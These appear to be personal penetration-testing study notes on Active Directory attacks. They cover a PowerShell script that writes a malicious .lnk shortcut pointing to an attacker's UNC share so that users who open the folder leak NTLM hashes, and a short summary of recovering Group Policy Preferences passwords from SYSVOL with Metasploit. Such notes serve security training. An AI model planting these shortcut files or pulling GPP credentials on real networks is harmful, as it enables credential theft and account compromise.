# Active Link File Attacks & GPP

<aside>
💡

Run in an elevated SHELL

</aside>

$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()

And thats it, once u load the drive, you basically get hashes of users who just load this file 🤷🏻

`Crazy`

Or we use netexec aswell

![image.png](Active%20Link%20File%20Attacks%20&%20GPP%2015d357aeddc08065af89eb2b14b25863/image.png)

Does this for us too.

<aside>
💡

Group Policy Preferences GPP

</aside>

- Allowed admins to create policies with embedded credentials.
- Password for encrypting the data for the credentials when created with GPP, can be obtained, due to bad handling, which results in Account compromise:

![image.png](Active%20Link%20File%20Attacks%20&%20GPP%2015d357aeddc08065af89eb2b14b25863/e9d682f5-3639-4341-8da6-df863b62d6ec.png)

- Still revelant

A Patch available, so attack works for unpatched systems, or if file is still on the system, due to mentioned key.

![image.png](Active%20Link%20File%20Attacks%20&%20GPP%2015d357aeddc08065af89eb2b14b25863/image%201.png)

Another way is to enumerate Key urself, but use Metasploit für ease of use.

<aside>
💡

ALL OF THOSE FILES TALKED ABOUT ARE STORED IN `SYSVOL`

</aside>